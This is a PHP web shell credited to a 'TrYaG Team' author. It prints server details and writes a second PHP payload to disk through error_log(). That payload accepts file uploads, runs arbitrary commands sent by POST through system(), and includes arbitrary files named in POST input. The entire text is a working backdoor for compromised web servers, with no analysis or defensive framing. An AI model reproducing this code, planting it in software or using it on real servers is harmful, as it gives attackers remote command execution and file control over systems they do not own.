<?php echo php_uname(); ?><?php echo(htmlentities($_SERVER['SERVER_SOFTWARE'])); ?><?php echo $SERVER_NAME; ?><?php echo $GATEWAY_INTERFACE; ?><?php echo $SERVER_PROTOCOL; ?><?php echo $SERVER_ADMIN; ?><?php echo $SERVER_ADDR; ?><?php echo $SERVER_PORT; ?><?php
// chr() //
if(empty($_POST['Mohajer22'])){
} else {
$m=$_POST['Mohajer22'];
$m=str_replace(" ","",$m);
$m=str_replace("(","",$m);
$m=str_replace(")","",$m);
$m=str_replace(".",";",$m);
$m=str_replace("chr","&#",$m);
$m=str_replace(" ","",$m);
echo $m ;
}
// ERORR //
if(empty($_POST['ERORR'])){
} else {
$ERORR=$_POST['ERORR'];
echo  error_log("
<html>
<head>
<title> Exploit: error_log() By * Super-Crystal  * </title>
<body bgcolor=\"#000000\">
<table Width='100%' height='10%' bgcolor='#8C0404' border='1'>
<tr>
<td><center><font size='6' color='#BBB516'> By  * Super-Crystal * TrYaG Team</font></center></td>
</tr>
</table>
<font color='#FF0000'>
</head>
<?
if(\$fileup == \"\"){
ECHO \" reade for up \";
}else{
\$path= exec(\"pwd\");
\$path .= \"/\$fileup_name\";
\$CopyFile = copy(\$fileup,\"\$path\");
if(\$CopyFile){
echo \" up ok \";
}else{
echo \" no up \";
}
}
if(empty(\$_POST['m'])){
} else {
\$m=\$_POST['m'];
echo  system(\$m);
}
if(empty(\$_POST['cmd'])){
} else {
\$h=  \$_POST['cmd'];
 print include(\$h) ;
   }


?>